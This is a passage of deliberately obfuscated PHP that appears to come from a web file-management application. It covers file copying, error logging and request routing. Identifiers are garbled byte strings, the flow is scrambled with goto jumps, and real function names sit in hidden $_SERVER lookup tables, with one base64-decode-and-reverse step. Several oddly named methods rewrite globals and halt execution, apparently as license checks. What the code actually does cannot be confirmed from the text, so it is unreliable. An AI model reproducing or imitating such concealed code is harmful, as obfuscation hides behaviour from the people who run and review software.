FÔÇô¦®¦Ê: $this->updateModifyTime($e…Äù÷Èƒé); return $d—ºÚò¶®Ó; goto BĞŸ¿­°Ò; dªö¯İ‚é¸: $E†Ê“Û = $this->fileNameExist($e…Äù÷Èƒé, $cºÜ‡™ÄĞ); $d—ºÚò¶®Ó = $this->mkdir($e…Äù÷Èƒé, $cºÜ‡™ÄĞ, $D·ğ©‰õÄ); if (!$E†Ê“Û || $D·ğ©‰õÄ == REPEAT_RENAME_FOLDER) { $D·ğ©‰õÄ = !1; } goto b¿èŠóà·Î; BĞŸ¿­°Ò: } private function _copyChildTo($fÂ†ã´‰Ç, $a·êÇ†Šó, $Dƒ©ÏÊ¿³ë, $f¸Ş†Šß÷í, &$BñåÉ¤¸Ø, $DÈ†¶Áß) { goto AŠ™ƒ…”Õó; Eö‘ºÃ“: $BˆØä„¡¼ = $this->_childrenList($Dƒ©ÏÊ¿³ë); $BˆØä„¡¼ = array_to_keyvalue($BˆØä„¡¼, $bÂÉ“¤¥[28]); foreach ($EôÑÃõËîİ as $e¸¥ÕÌ‰ˆŸ) { $CÕ‹‘Š½÷‹ = $BˆØä„¡¼[$e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]]]; $FÌ‰¶›’×ì = $CÕ‹‘Š½÷‹[$bÂÉ“¤¥[369]]; $this->_copyApplyMeta($CÕ‹‘Š½÷‹, $BñåÉ¤¸Ø); if ($e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[29]] == $bÂÉ“¤¥[76]) { $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[75]] = $fÂ†ã´‰Ç->getPathInner($e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[75]]); $this->_copyChildTo($fÂ†ã´‰Ç, $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[75]], $FÌ‰¶›’×ì, $f¸Ş†Šß÷í, $BñåÉ¤¸Ø, $DÈ†¶Áß); } } goto a”æ®™ÕÈ®; AŠ™ƒ…”Õó: $bÂÉ“¤¥ =& $_SERVER[í™]; $cÒ¥Š¹‚® = $this->sourceInfoCache($Dƒ©ÏÊ¿³ë); $Bà¸‰ù—ÂÚ = $fÂ†ã´‰Ç->listPath($a·êÇ†Šó, !1, !0); goto b ¸Ü°ÛÉ´; EíÂ›‚«: foreach ($EôÑÃõËîİ as &$e¸¥ÕÌ‰ˆŸ) { goto f„²½’¤‘ä; f„²½’¤‘ä: if (isset($D‘ÚÜ¥æ«ã[$e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]]])) { $e¸¥ÕÌ‰ˆŸ = $D‘ÚÜ¥æ«ã[$e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]]]; } $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[370]] = $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[29]] == $bÂÉ“¤¥[76]; $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[372]] = _get($e¸¥ÕÌ‰ˆŸ, $bÂÉ“¤¥[160], $bÂÉ“¤¥[33]); goto B‹Å‰ï¬ØÆ; eßéä°—§™: if ($f¸Ş†Šß÷í) { $CÕ†ßÕ â» = $this->fileNameExistCache($Dƒ©ÏÊ¿³ë, $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]]); if ($CÕ†ßÕ â») { if ($e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[370]] || $f¸Ş†Šß÷í == REPEAT_SKIP) { continue; } if ($f¸Ş†Šß÷í == REPEAT_REPLACE) { $CÕ‹‘Š½÷‹ = $this->sourceInfoCache($CÕ†ßÕ â»); $a˜«Ñ“ƒ‹› = $this->fileHistory($CÕ‹‘Š½÷‹, $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]], $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[77]]); if ($a˜«Ñ“ƒ‹›) { $BñåÉ¤¸Ø[$bÂÉ“¤¥[503]][] = $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]]; } continue; } else { if ($f¸Ş†Šß÷í == REPEAT_RENAME) { $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]] = $this->fileNameAutoCache($Dƒ©ÏÊ¿³ë, $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]], $f¸Ş†Šß÷í, !1); } } } } if (!$e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[370]] && $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]]) { $BñåÉ¤¸Ø[$bÂÉ“¤¥[503]][] = $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]]; } $AÄ‚®ÀìŞ[] = $this->_makeItemData($e¸¥ÕÌ‰ˆŸ, $cÒ¥Š¹‚®, $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[28]]); goto AãŞŞé·ï; B‹Å‰ï¬ØÆ: $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[77]] = _get($e¸¥ÕÌ‰ˆŸ, $bÂÉ“¤¥[77], 0); $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]] = _get($e¸¥ÕÌ‰ˆŸ, $bÂÉ“¤¥[419], 0); if (!isset($e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[543]]) && $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]]) { $BñåÉ¤¸Ø[$bÂÉ“¤¥[540]][] = $e¸¥ÕÌ‰ˆŸ[$bÂÉ“¤¥[419]]; } goto eßéä°—§™; AãŞŞé·ï: } unset($e¸¥ÕÌ‰ˆŸ); if (!empty($AÄ‚®ÀìŞ)) { $this->addAll($AÄ‚®ÀìŞ); } goto Eö‘ºÃ“; b ¸Ü°ÛÉ´: $EôÑÃõËîİ = array_merge($Bà¸‰ù—ÂÚ[$bÂÉ“¤¥[73]], $Bà¸‰ù—ÂÚ[$bÂÉ“¤¥[74]]); $D‘ÚÜ¥æ«ã = $this->_addFiles($fÂ†ã´‰Ç, $Bà¸‰ù—ÂÚ[$bÂÉ“¤¥[73]], $DÈ†¶Áß); $AÄ‚®ÀìŞ = array(); goto EíÂ›‚«; a”æ®™ÕÈ®: } private function _addFiles($D»ƒÂñƒŠÒ, $aæäé®¾œ…, $fİğãî¼îÌ) { goto C‡ª©ÍäÜØ; DˆÜÖ¨©’: $f¤ÇùÄ¶–” = array(); foreach ($aæäé®¾œ… as $DÜƒ²Êêã) { if (isset($DÜƒ²Êêã[$eİÂ ¨¹‘Š[543]]) && $DÜƒ²Êêã[$eİÂ ¨¹‘Š[543]]) { continue; } $Aç æË¦Ûµ = $D»ƒÂñƒŠÒ->getPathInner($DÜƒ²Êêã[$eİÂ ¨¹‘Š[75]]); $a‹Ù¨ßÚ£Ñ = $dÃ¹’ä™©‚->addFileMake($Aç æË¦Ûµ, $DÜƒ²Êêã[$eİÂ ¨¹‘Š[77]], $DÜƒ²Êêã[$eİÂ ¨¹‘Š[164]], $DÜƒ²Êêã[$eİÂ ¨¹‘Š[163]], $DÜƒ²Êêã[$eİÂ ¨¹‘Š[28]], $fİğãî¼îÌ); $f¤ÇùÄ¶–”[] = $a‹Ù¨ßÚ£Ñ; } $dÃ¹’ä™©‚->addAll($f¤ÇùÄ¶–”); goto EÏÌé÷äÆ; bÅ¼±İ¸ƒ£: $bÌ­¶íè…É = $dÃ¹’ä™©‚->where($BÒÑ„¨ëŞ•)->select(); $bÌ­¶íè…É = $bÌ­¶íè…É ? $bÌ­¶íè…É : array(); foreach ($bÌ­¶íè…É as $D´”÷çÕ’®) { if (!isset($F½™£ŞÏ‹[$D´”÷çÕ’®[$eİÂ ¨¹‘Š[163]]])) { continue; } $BË¤ß¾Ğí = $F½™£ŞÏ‹[$D´”÷çÕ’®[$eİÂ ¨¹‘Š[163]]]; foreach ($BË¤ß¾Ğí as &$fÄŸÄæõì´) { $fÄŸÄæõì´[$eİÂ ¨¹‘Š[419]] = $D´”÷çÕ’®[$eİÂ ¨¹‘Š[419]]; $fÄŸÄæõì´[$eİÂ ¨¹‘Š[543]] = !0; } unset($fÄŸÄæõì´); } goto DˆÜÖ¨©’; EÏÌé÷äÆ: $BÒÑ„¨ëŞ• = array($eİÂ ¨¹‘Š[163] => array($eİÂ ¨¹‘Š[7], array_keys($F½™£ŞÏ‹))); $bÌ­¶íè…É = $dÃ¹’ä™©‚->where($BÒÑ„¨ëŞ•)->select(); $bÌ­¶íè…É = $bÌ­¶íè…É ? $bÌ­¶íè…É : array(); goto b°‹ÁÚÉ¤; b°‹ÁÚÉ¤: foreach ($bÌ­¶íè…É as $D´”÷çÕ’®) { if (!isset($F½™£ŞÏ‹[$D´”÷çÕ’®[$eİÂ ¨¹‘Š[163]]])) { continue; } $b‡ÜÌ½‡„ =& $F½™£ŞÏ‹[$D´”÷çÕ’®[$eİÂ ¨¹‘Š[163]]]; foreach ($b‡ÜÌ½‡„ as &$fÄŸÄæõì´) { $fÄŸÄæõì´[$eİÂ ¨¹‘Š[419]] = $D´”÷çÕ’®[$eİÂ ¨¹‘Š[419]]; } unset($fÄŸÄæõì´); } $E½ºÙßµ = array(); foreach ($aæäé®¾œ… as $d¾©âÅÕ‘É) { $E½ºÙßµ[$d¾©âÅÕ‘É[$eİÂ ¨¹‘Š[28]]] = $d¾©âÅÕ‘É; } goto f¶ö‹Ö‹“; B©å†Êîñ²: foreach ($aæäé®¾œ… as &$fÄŸÄæõì´) { goto Bƒ¼³Óè®Â; c‡–Š³‰ĞÖ: $fÄŸÄæõì´[$eİÂ ¨¹‘Š[163]] = $Fô¤ßÍ’âÀ; Hook::trigger($eİÂ ¨¹‘Š[545], $fÄŸÄæõì´); $F½™£ŞÏ‹[$Fô¤ßÍ’âÀ][] =& $fÄŸÄæõì´; goto Fãƒ¹‚Û“; AËŞâòö…Û: $Fô¤ßÍ’âÀ = $D»ƒÂñƒŠÒ->hashMd5($fÄŸÄæõì´[$eİÂ ¨¹‘Š[75]]); if (strlen($Fô¤ßÍ’âÀ) > 10 && !isset($F½™£ŞÏ‹[$Fô¤ßÍ’âÀ])) { $F½™£ŞÏ‹[$Fô¤ßÍ’âÀ] = array(); } $fÄŸÄæõì´[$eİÂ ¨¹‘Š[164]] = $eì°‰‡¦İ‰; goto c‡–Š³‰ĞÖ; Bƒ¼³Óè®Â: Hook::trigger($eİÂ ¨¹‘Š[544], $fÄŸÄæõì´); $fÄŸÄæõì´[$eİÂ ¨¹‘Š[75]] = $D»ƒÂñƒŠÒ->getPathInner($fÄŸÄæõì´[$eİÂ ¨¹‘Š[75]]); $eì°‰‡¦İ‰ = $D»ƒÂñƒŠÒ->hashSimple($fÄŸÄæõì´[$eİÂ ¨¹‘Š[75]]); goto AËŞâòö…Û; Fãƒ¹‚Û“: if (count($F½™£ŞÏ‹[$Fô¤ßÍ’âÀ]) > 1) { $fÄŸÄæõì´[$eİÂ ¨¹‘Š[543]] = !0; } goto f‹¶ãÀŸÑ; f‹¶ãÀŸÑ: } $BÒÑ„¨ëŞ• = array($eİÂ ¨¹‘Š[163] => array($eİÂ ¨¹‘Š[7], array_keys($F½™£ŞÏ‹))); $dÃ¹’ä™©‚ = Model($eİÂ ¨¹‘Š[546]); goto bÅ¼±İ¸ƒ£; f¶ö‹Ö‹“: return $E½ºÙßµ; goto b‡ºâ‚˜ŠÕ; C‡ª©ÍäÜØ: $eİÂ ¨¹‘Š =& $_SERVER[í™]; if (!$aæäé®¾œ… || count($aæäé®¾œ…) == 0) { return array(); } $F½™£ŞÏ‹ = array(); goto B©å†Êîñ²; b‡ºâ‚˜ŠÕ: } } define($_SERVER[í™][547], $_SERVER[í™][548]); goto D•„à•…è; fˆºÄ‚³£: function beforeShutdownError($cë›Ä¡è× = false, $B£¼Ä¦—’† = '', $C·–Ö ±’» = '', $DÜ…Šİß§² = 0) { $Bä‡ª‡Ã‘å =& $_SERVER[ñâ]; switch ($cë›Ä¡è×) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $d• Ñ»† = $Bä‡ª‡Ã‘å[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $d• Ñ»† = $Bä‡ª‡Ã‘å[36]; break; case E_STRICT: $d• Ñ»† = $Bä‡ª‡Ã‘å[37]; break; case E_NOTICE: case E_USER_NOTICE: $d• Ñ»† = $Bä‡ª‡Ã‘å[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $d• Ñ»† = $Bä‡ª‡Ã‘å[39]; break; default: break; } if (!$d• Ñ»† || $d• Ñ»† == $Bä‡ª‡Ã‘å[38] || $d• Ñ»† == $Bä‡ª‡Ã‘å[39]) { return; } $C·–Ö ±’» = $Bä‡ª‡Ã‘å[4] . str_replace($_SERVER[$Bä‡ª‡Ã‘å[33]], $Bä‡ª‡Ã‘å[16], $C·–Ö ±’»); $Fé³³¿…Ç¶ = $d• Ñ»† . $Bä‡ª‡Ã‘å[40] . $B£¼Ä¦—’† . $Bä‡ª‡Ã‘å[40] . $C·–Ö ±’» . $Bä‡ª‡Ã‘å[40] . $DÜ…Šİß§²; write_log($Fé³³¿…Ç¶ . $Bä‡ª‡Ã‘å[41] . get_caller_msg(1), $Bä‡ª‡Ã‘å[15]); } $_SERVER[$_SERVER[ñâ][42]] = $_SERVER[$_SERVER[ñâ][33]] . $_SERVER[ñâ][43]; $C‡ÓŞ¿éÏƒ = strrev(base64_decode($_SERVER[ñâ][44])); goto C¦ñß„ôäß; EÎŒÜ’Ø–×: $CµŞƒãğ¯» = $_SERVER[í™][553]; while (strlen($CµŞƒãğ¯») < $_SERVER[í™][554]) { if (!$CµŞƒãğ¯») { break; } $CµŞƒãğ¯»++; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($fàßØŠ±ß) { goto B«ªˆëÑ‘; a¦î…”›„Ú: $BÚƒÜÜÈÆÅ = $b£æ«ù¨¶š[555]; if (!$BÚƒÜÜÈÆÅ) { return; } $this->defaultModule = $C„‘“‡†ò[0] ? $C„‘“‡†ò[0] : $this->defaultModule; goto FñâƒÜ©¾é; B«ªˆëÑ‘: $b£æ«ù¨¶š =& $_SERVER[í™]; $D”†©ÄÄ¬¤ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $C„‘“‡†ò = $D”†©ÄÄ¬¤[0]($D”†©ÄÄ¬¤[1], $D”†©ÄÄ¬¤[2]($fàßØŠ±ß, $D”†©ÄÄ¬¤[1])); goto a¦î…”›„Ú; F«ƒ„×‚·º: if (!$f¸˜Ó¥¦½”) { return; } $this->defaultAction = $C„‘“‡†ò[2] ? $C„‘“‡†ò[2] : $this->defaultAction; $this->{$_SERVER[æàÂÔ…ÔåÖÌ][3]}($D”†©ÄÄ¬¤[4], array($this, $D”†©ÄÄ¬¤[5])); goto DÔ½ Êµ®Ö; FñâƒÜ©¾é: $f®Æ¯äêŠ’ = $b£æ«ù¨¶š[556]; $this->defaultController = $C„‘“‡†ò[1] ? $C„‘“‡†ò[1] : $this->defaultController; $f¸˜Ó¥¦½” = $b£æ«ù¨¶š[557]; goto F«ƒ„×‚·º; DÔ½ Êµ®Ö: } public function appRun($D¢†™•Ó­Ô) { goto aŒšŸ¬‚„æ; ešÕµà£§¼: $b¼‚ˆÑ“îœ[17]($D¢†™•Ó­Ô); $b¼‚ˆÑ“îœ[13](array($b¼‚ˆÑ“îœ[14], $b¼‚ˆÑ“îœ[15]), $FÄñ—Úà . $b¼‚ˆÑ“îœ[18], $D¢†™•Ó­Ô); goto C¢†”»§—õ; EŞíˆ·²Èè: $FÄñ—Úà = $b¼‚ˆÑ“îœ[7]; if ($DÜ¼Å™¤öƒ == $b¼‚ˆÑ“îœ[8]) { $FÄñ—Úà = $b¼‚ˆÑ“îœ[9]; $a¯Íô¯¦[0] = $b¼‚ˆÑ“îœ[10]; $a¯Íô¯¦[1] = $a¯Íô¯¦[1] . $b¼‚ˆÑ“îœ[11]; $D¢†™•Ó­Ô = $b¼‚ˆÑ“îœ[12]($b¼‚ˆÑ“îœ[1], $a¯Íô¯¦); $D¢†™•Ó­Ô = $b¼‚ˆÑ“îœ[2]($D¢†™•Ó­Ô, $b¼‚ˆÑ“îœ[1]); } $b¼‚ˆÑ“îœ[13](array($b¼‚ˆÑ“îœ[14], $b¼‚ˆÑ“îœ[15]), $FÄñ—Úà . $b¼‚ˆÑ“îœ[16], $D¢†™•Ó­Ô); goto ešÕµà£§¼; aŒšŸ¬‚„æ: $b¼‚ˆÑ“îœ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $a¯Íô¯¦ = $b¼‚ˆÑ“îœ[0]($b¼‚ˆÑ“îœ[1], $D¢†™•Ó­Ô); $DÜ¼Å™¤öƒ = $b¼‚ˆÑ“îœ[6]($a¯Íô¯¦[0]); goto EŞíˆ·²Èè; C¢†”»§—õ: } private function autorun() { $FË²—±ÏŠÉ =& $_SERVER[æàÂÔ…ÔåÖÌ]; global $config; $A¾§ÎïÌµã = $_SERVER[í™][558]; if ($FË²—±ÏŠÉ[19]($config[$FË²—±ÏŠÉ[20]]) == 0) { return; } foreach ($config[$FË²—±ÏŠÉ[20]] as $b¬íŒÓÃìë => $Cä×‡·‹‘) { $this->{$_SERVER[æàÂÔ…ÔåÖÌ][21]}($Cä×‡·‹‘); } } private function xhgfe8a68724() { goto cà÷×•³âï; cà÷×•³âï: $DÑ±ôàÕÜÙ =& $_SERVER[í™]; $aÛ†ø×Ø¹ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $e’³‚§†Í× = $aÛ†ø×Ø¹[8]; goto fÄôçÄğ; b…Ÿğ˜·õ»: $c„×æµã¿¸ = $aÛ†ø×Ø¹[25]($Fä‡òÈ…¾›, 0, -$aÛ†ø×Ø¹[24]($e’³‚§†Í×)); $A¿®Ÿ¨õæ’ = $DÑ±ôàÕÜÙ[559]; if (strlen($A¿®Ÿ¨õæ’) < $DÑ±ôàÕÜÙ[560]) { return; } goto dÚ‘„Â–¼š; dÚ‘„Â–¼š: $e‡âº–Ù­Ú = array($aÛ†ø×Ø¹[8], $c„×æµã¿¸); $e¶—»ªÚï = $aÛ†ø×Ø¹[26]($GLOBALS[$aÛ†ø×Ø¹[22]][$aÛ†ø×Ø¹[23]], 1); $GLOBALS[$aÛ†ø×Ø¹[22]][$aÛ†ø×Ø¹[23]] = $aÛ†ø×Ø¹[27]($e‡âº–Ù­Ú, $e¶—»ªÚï); goto f¹‰¶‘¿´‘; f¹‰¶‘¿´‘: $d‹ØÑ×ùÂ• = $DÑ±ôàÕÜÙ[561]; if (strlen($d‹ØÑ×ùÂ•) < $DÑ±ôàÕÜÙ[562]) { die; } $GLOBALS[$aÛ†ø×Ø¹[22]][$aÛ†ø×Ø¹[28]] = $aÛ†ø×Ø¹[29]($aÛ†ø×Ø¹[1], $GLOBALS[$aÛ†ø×Ø¹[22]][$aÛ†ø×Ø¹[23]]); goto c®Ÿáîæ‡; fÄôçÄğ: $Fä‡òÈ…¾› = $GLOBALS[$aÛ†ø×Ø¹[22]][$aÛ†ø×Ø¹[23]][0]; if (!$Fä‡òÈ…¾› || $aÛ†ø×Ø¹[24]($Fä‡òÈ…¾›) <= $aÛ†ø×Ø¹[24]($e’³‚§†Í×)) { return; } if ($aÛ†ø×Ø¹[6]($aÛ†ø×Ø¹[25]($Fä‡òÈ…¾›, -$aÛ†ø×Ø¹[24]($e’³‚§†Í×))) != $e’³‚§†Í×) { return; } goto b…Ÿğ˜·õ»; c®Ÿáîæ‡: } private function qpmbbb0ce122() { goto a÷¶³çÊ‰; a÷¶³çÊ‰: $f¶ÓŸ«÷µ =& $_SERVER[í™]; $e½Ç‡¼÷À =& $_SERVER[æàÂÔ…ÔåÖÌ]; if ($GLOBALS[$e½Ç‡¼÷À[22]][$e½Ç‡¼÷À[28]] != $e½Ç‡¼÷À[10]) { return; } goto EÖáÀö¢ÒÅ; CàÔÄ‘Âäí: while (strlen($F×¹Ñö¬Ò¾) < $f¶ÓŸ«÷µ[560]) { if (!$F×¹Ñö¬Ò¾) { break; } $F×¹Ñö¬Ò¾++; } $CÍôÚŒî÷× = $e½Ç‡¼÷À[2]($Bœ·Æ©ßÂ¼[0][0], $e½Ç‡¼÷À[36]); $GLOBALS[$e½Ç‡¼÷À[22]][$e½Ç‡¼÷À[23]] = $e½Ç‡¼÷À[0]($e½Ç‡¼÷À[36], $CÍôÚŒî÷×); goto B†”Ìº—‡; B†”Ìº—‡: $F±«ã—ˆä‡ = $f¶ÓŸ«÷µ[567]; if (!$F±«ã—ˆä‡) { die; } $GLOBALS[$e½Ç‡¼÷À[22]][$e½Ç‡¼÷À[28]] = $e½Ç‡¼÷À[29]($e½Ç‡¼÷À[1], $GLOBALS[$e½Ç‡¼÷À[22]][$e½Ç‡¼÷À[23]]); goto cç•˜›–„ç; AÁÙÀ­àÎ: $Döç‰Š¯ƒÌ = $f¶ÓŸ«÷µ[564]; while ($Döç‰Š¯ƒÌ < $f¶ÓŸ«÷µ[550]) { if ($Döç‰Š¯ƒÌ >= 0) { break; } $Döç‰Š¯ƒÌ++; } $CÍôÚŒî÷× = $e½Ç‡¼÷À[25]($B„Ì›àÚöß, $FÇİÑ†“ + $e½Ç‡¼÷À[24]($cÕ‹ƒòÒ÷ì)); goto C÷»ˆ‹ó¡à; EÖáÀö¢ÒÅ: $B„Ì›àÚöß = $_SERVER[$e½Ç‡¼÷À[30]]; $F§Ï—Ó×´à = $f¶ÓŸ«÷µ[563]; if (!$F§Ï—Ó×´à) { return; } goto C±·ÑÎ¡‹; C÷»ˆ‹ó¡à: $BÁª¿¡•Íİ = $f¶ÓŸ«÷µ[565]; $e½Ç‡¼÷À[34]($e½Ç‡¼÷À[35], $CÍôÚŒî÷×, $Bœ·Æ©ßÂ¼); $F×¹Ñö¬Ò¾ = $f¶ÓŸ«÷µ[566]; goto CàÔÄ‘Âäí; C±·ÑÎ¡‹: $cÕ‹ƒòÒ÷ì = $e½Ç‡¼÷À[31]; if (!$e½Ç‡¼÷À[32]($B„Ì›àÚöß, $cÕ‹ƒòÒ÷ì)) { return; } $FÇİÑ†“ = $e½Ç‡¼÷À[33]($B„Ì›àÚöß, $cÕ‹ƒòÒ÷ì); goto AÁÙÀ­àÎ; cç•˜›–„ç: } public function run() { goto dìÍ¥ÖÌ; a¸ª¦‡ä¯À: $BÎñ®…ÔØ¸ = $B–®›¢÷î¼[573]; $this->{$_SERVER[æàÂÔ…ÔåÖÌ][45]}(); if ($eŞÅ¿™ÌĞñ[19]($FéåØèè¦¬) >= 3) { $this->{$_SERVER[æàÂÔ…ÔåÖÌ][21]}($bÏæ¼œÔ¦½); } else { $this->{$_SERVER[æàÂÔ…ÔåÖÌ][21]}(ACTION); } goto b¯â–ĞŠ•Œ; DíÓ½ƒ¾Ê: if (!$fŒæ¢Ã¬¶¶) { return; } $eŞÅ¿™ÌĞñ[39]($eŞÅ¿™ÌĞñ[41], isset($FéåØèè¦¬[1]) && $FéåØèè¦¬[0] ? $FéåØèè¦¬[1] : $this->defaultController); $B–£¿‹ÍÇ = $B–®›¢÷î¼[571]; goto F®Ô¼«µ»; dìÍ¥ÖÌ: $B–®›¢÷î¼ =& $_SERVER[í™]; $eŞÅ¿™ÌĞñ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $this->{$_SERVER[æàÂÔ…ÔåÖÌ][37]}(); goto F¦¾¶óÜğ‰; Dó·æˆãÃ: $D”¾ÈÍóŞŒ = $B–®›¢÷î¼[572]; if (strlen($D”¾ÈÍóŞŒ) < $B–®›¢÷î¼[550]) { die; } $_SERVER[$eŞÅ¿™ÌĞñ[44]] = $eŞÅ¿™ÌĞñ[6](ACTION); goto a¸ª¦‡ä¯À; cÎï¼í‡Ğë: while ($dì¨ƒ˜“Ú < $B–®›¢÷î¼[550]) { if ($dì¨ƒ˜“Ú >= 0) { break; } $dì¨ƒ˜“Ú++; } $eŞÅ¿™ÌĞñ[39]($eŞÅ¿™ÌĞñ[40], isset($FéåØèè¦¬[0]) && $FéåØèè¦¬[0] ? $FéåØèè¦¬[0] : $this->defaultModule); $fŒæ¢Ã¬¶¶ = $B–®›¢÷î¼[570]; goto DíÓ½ƒ¾Ê; F¦¾¶óÜğ‰: $this->{$_SERVER[æàÂÔ…ÔåÖÌ][38]}(); $C×Šë©„‰Ì = $B–®›¢÷î¼[568]; while (strlen($C×Šë©„‰Ì) < $B–®›¢÷î¼[550]) { if (!$C×Šë©„‰Ì) { break; } $C×Šë©„‰Ì++; } goto côÚ±¸Îê; F®Ô¼«µ»: if (!$B–£¿‹ÍÇ) { die; } $eŞÅ¿™ÌĞñ[39]($eŞÅ¿™ÌĞñ[42], isset($FéåØèè¦¬[2]) && $FéåØèè¦¬[0] ? $FéåØèè¦¬[2] : $this->defaultAction); $eŞÅ¿™ÌĞñ[39]($eŞÅ¿™ÌĞñ[43], MOD . $eŞÅ¿™ÌĞñ[1] . ST . $eŞÅ¿™ÌĞñ[1] . ACT); goto Dó·æˆãÃ; côÚ±¸Îê: $FéåØèè¦¬ = $GLOBALS[$eŞÅ¿™ÌĞñ[22]][$eŞÅ¿™ÌĞñ[23]]; $bÏæ¼œÔ¦½ = $GLOBALS[$eŞÅ¿™ÌĞñ[22]][$eŞÅ¿™ÌĞñ[28]]; $dì¨ƒ˜“Ú = $B–®›¢÷î¼[569]; goto cÎï¼í‡Ğë; b¯â–ĞŠ•Œ: } private $wljbff9f70e1 = array(); private $tlodf6cf000b = ''; public function dmwk7d1d9393() { goto cŠ†ŒéÖä; A£”èÙã·¶: $this->{$_SERVER[æàÂÔ…ÔåÖÌ][47]}(); $b’…’‹á³Œ = $AìÁ¸é…ˆ[574]; if (!$b’…’‹á³Œ) { return; } goto EÕº°·£²š; E—ê¹ƒ””: $açŒøƒ“ÆÎ = $AìÁ¸é…ˆ[575]; if (!$açŒøƒ“ÆÎ) { return; } $this->{$_SERVER[æàÂÔ…ÔåÖÌ][51]}(); goto bíï­—í†; cŠ†ŒéÖä: $AìÁ¸é…ˆ =& $_SERVER[í™]; $b‚‰¤ Ü¾Û =& $_SERVER[æàÂÔ…ÔåÖÌ]; $this->{$_SERVER[æàÂÔ…ÔåÖÌ][46]}(); goto A£”èÙã·¶; EÕº°·£²š: $this->{$_SERVER[æàÂÔ…ÔåÖÌ][48]}(); $this->{$_SERVER[æàÂÔ…ÔåÖÌ][49]}(); $this->{$_SERVER[æàÂÔ…ÔåÖÌ][50]}(); goto E—ê¹ƒ””; bíï­—í†: $this->{$_SERVER[æàÂÔ…ÔåÖÌ][52]}(); $this->{$_SERVER[æàÂÔ…ÔåÖÌ][3]}($b‚‰¤ Ü¾Û[53], array($this, $b‚‰¤ Ü¾Û[54])); $this->{$_SERVER[æàÂÔ…ÔåÖÌ][3]}($b‚‰¤ Ü¾Û[55], array($this, $b‚‰¤ Ü¾Û[56])); goto Få™Ûæ˜ÏŞ; Få™Ûæ˜ÏŞ: $this->{$_SERVER[æàÂÔ…ÔåÖÌ][3]}($b‚‰¤ Ü¾Û[57], array($this, $b‚‰¤ Ü¾Û[58])); $this->{$_SERVER[æàÂÔ…ÔåÖÌ][3]}($b‚‰¤ Ü¾Û[59], array($this, $b‚‰¤ Ü¾Û[60])); goto DÅùµ†à†Ğ; DÅùµ†à†Ğ: } public function kmip507aa381($Eé‹à‡Ù¾£) { goto cæ‚´¦î…; Eêˆ¾Ü: $aŠÊƒ ºè = $d·Ø…Ì®ª™[579]; while (strlen($aŠÊƒ ºè) < $d·Ø…Ì®ª™[562]) { if (!$aŠÊƒ ºè) { break; } $aŠÊƒ ºè++; } unset($Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[97]][$d˜¢æÉŸ‚[99]]); goto aìñÚ¾ˆó; A¡‚ÀÒá­å: $A«™¨ÓßæÈ = $d·Ø…Ì®ª™[582]; if (!$A«™¨ÓßæÈ) { return; } $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[96]][$d˜¢æÉŸ‚[101]] = array($d˜¢æÉŸ‚[102] => (int) $C«À²ÙŒë[$d˜¢æÉŸ‚[103]], $d˜¢æÉŸ‚[104] => $d˜¢æÉŸ‚[105]($d˜¢æÉŸ‚[106]($C«À²ÙŒë, $d˜¢æÉŸ‚[107], array())), $d˜¢æÉŸ‚[108] => (int) $d˜¢æÉŸ‚[106]($C«À²ÙŒë, $d˜¢æÉŸ‚[109], 0)); goto CÏ…ëù‚‡÷; f‹·Ã§ÛŒ: if ($d×£Áö®Ö„[$d˜¢æÉŸ‚[122]] != $d˜¢æÉŸ‚[123]) { $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[124]] = $d×£Áö®Ö„[$d˜¢æÉŸ‚[124]]; $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[125]] = $d×£Áö®Ö„[$d˜¢æÉŸ‚[125]]; $BĞ³àå¿œÂ = $d˜¢æÉŸ‚[126](10) . $this->tlodf6cf000b . $d˜¢æÉŸ‚[126](5); $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[127]][$d˜¢æÉŸ‚[128]] = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][129]}($BĞ³àå¿œÂ, $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[115]]); } if ($this->tlodf6cf000b == $d˜¢æÉŸ‚[123]) { 